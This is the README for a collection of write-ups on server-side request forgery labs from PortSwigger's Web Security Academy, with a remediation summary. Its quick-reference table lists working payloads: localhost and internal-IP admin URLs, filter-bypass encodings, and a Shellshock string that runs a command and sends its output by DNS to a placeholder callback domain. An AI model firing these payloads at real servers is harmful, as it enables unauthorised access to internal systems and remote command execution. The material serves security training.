# 06 — Server-Side Request Forgery (SSRF)

Professional PoC writeups for the **Server-Side Request Forgery (SSRF)** category, covering PortSwigger Web Security Academy labs from basic in-band exploitation through filter bypasses to blind, out-of-band, and remote-code-execution-chained attacks.

> CWE-918 — Server-Side Request Forgery (SSRF)
> OWASP Top 10:2025 — A10: Server-Side Request Forgery

---

## What is SSRF?

Server-side request forgery is a vulnerability that lets an attacker induce the server-side application to issue HTTP (or other protocol) requests to a destination of the attacker's choosing, rather than the one the application intended. Because the request originates **from the server itself**, it is often treated as implicitly trusted — bypassing network-level access controls (firewalls, private subnets) and application-level access controls (admin panels that trust "local" requests).

SSRF is typically split into two classes:

- **Regular (in-band) SSRF** — the response from the attacker-controlled back-end request is returned to the attacker in the application's own HTTP response, allowing direct interaction with internal systems.
- **Blind SSRF** — the back-end request is triggered, but its response is never reflected back. Confirmation and exploitation rely on out-of-band (OAST) techniques, such as monitoring for DNS/HTTP callbacks to an attacker-controlled Collaborator server.

---

## 📂 Labs Covered

| # | Lab | Difficulty | Technique | Writeup |
|---|---|---|---|---|
| 01 | Basic SSRF against the local server | Apprentice | In-band — loopback/localhost trust | [Lab-01-Basic-SSRF-Local-Server.md](./Lab-01-Basic-SSRF-Local-Server.md) |
| 02 | Basic SSRF against another back-end system | Apprentice | In-band — internal network scanning via Intruder | [Lab-02-Basic-SSRF-Backend-System.md](./Lab-02-Basic-SSRF-Backend-System.md) |
| 03 | SSRF with blacklist-based input filter | Practitioner | Filter bypass — alternate IP encodings + double URL-encoding | [Lab-03-Blacklist-Filter-Bypass.md](./Lab-03-Blacklist-Filter-Bypass.md) |
| 04 | SSRF with filter bypass via open redirection vulnerability | Practitioner | Filter bypass — chaining an open redirect | [Lab-04-Open-Redirect-Filter-Bypass.md](./Lab-04-Open-Redirect-Filter-Bypass.md) |
| 05 | Blind SSRF with out-of-band detection | Practitioner | Blind — OAST via the `Referer` header | [Lab-05-Blind-SSRF-OOB-Detection.md](./Lab-05-Blind-SSRF-OOB-Detection.md) |
| 06 | SSRF with whitelist-based input filter | Expert | Filter bypass — URL-parser differential (`@`, `#`, double-encoding) | [Lab-06-Whitelist-Filter-Bypass.md](./Lab-06-Whitelist-Filter-Bypass.md) |
| 07 | Blind SSRF with Shellshock exploitation | Expert | Blind SSRF chained into RCE (CVE-2014-6271) + DNS exfiltration | [Lab-07-Blind-SSRF-Shellshock.md](./Lab-07-Blind-SSRF-Shellshock.md) |

📘 **[METHODOLOGY.md](./METHODOLOGY.md)** — the full testing methodology (recon, decision tree, filter-bypass cheat sheet, payload reference, checklist) referenced by every writeup above.

---

## 🧰 Quick Reference — Core Techniques

| Scenario | Technique | Example |
|---|---|---|
| Server trusts requests from itself | Redirect to loopback | `stockApi=http://localhost/admin` |
| Internal network reachable but not mapped | Brute-force the private IP range with Burp Intruder | `http://192.168.0.§1§:8080/admin` |
| Blacklist blocks `127.0.0.1` / `localhost` | Alternate IP representations | `127.1`, `2130706433`, `017700000001`, `0x7f000001` |
| Blacklist blocks a keyword (e.g. `admin`) | Double URL-encoding | `a` → `%61` → `%2561` |
| Whitelist checks only the hostname | Embedded credentials / URL-parser differential | `http://allowed-host%2523@attacker-or-internal-host/` |
| Whitelist only allows same-origin paths | Chain through an open redirect | `/product/nextProduct?path=http://internal-ip:port/admin` |
| No reflected output at all | Out-of-band detection via Collaborator | Inject a Collaborator domain into `Referer` |
| Blind SSRF reaching a vulnerable internal host | Chain into RCE (e.g. Shellshock) + DNS exfiltration | `() { :; }; nslookup $(whoami).collaborator-domain` in `User-Agent` |

## 🛡️ Remediation Summary

1. **Avoid outbound requests driven by user input wherever possible.** If the application must fetch a resource, prefer letting the user choose from a short, server-side-defined list of options rather than accepting arbitrary URLs.
2. **Disable unused URL schemas and HTTP redirects** in the client making the back-end request, so `file://`, `gopher://`, and automatic redirect-following can't be abused.
3. **Validate with a strict allowlist, not a blacklist.** Blacklisting specific strings (`127.0.0.1`, `admin`) is reliably bypassable via alternate encodings.
4. **Parse the URL once, with a single canonical parser, and validate the parsed hostname/IP — not the raw string.** Parser differentials between the validating code and the code that issues the request are the root cause of most whitelist bypasses.
5. **Segment the network and apply firewall rules so that app servers can only reach what they strictly need**, limiting the blast radius even if an SSRF vulnerability exists.
6. **Don't rely on authentication bypass via "is this request local" checks** for sensitive admin functionality — this pattern is exactly what regular SSRF against the local server abuses.

## 📚 References

- [PortSwigger — Server-side request forgery (SSRF)](https://portswigger.net/web-security/ssrf)
- [PortSwigger — Blind SSRF](https://portswigger.net/web-security/ssrf/blind)
- [PortSwigger — SSRF / URL validation bypass cheat sheet](https://portswigger.net/web-security/ssrf)
- [CWE-918](https://cwe.mitre.org/data/definitions/918.html)
- [OWASP Top 10](https://owasp.org/Top10/)
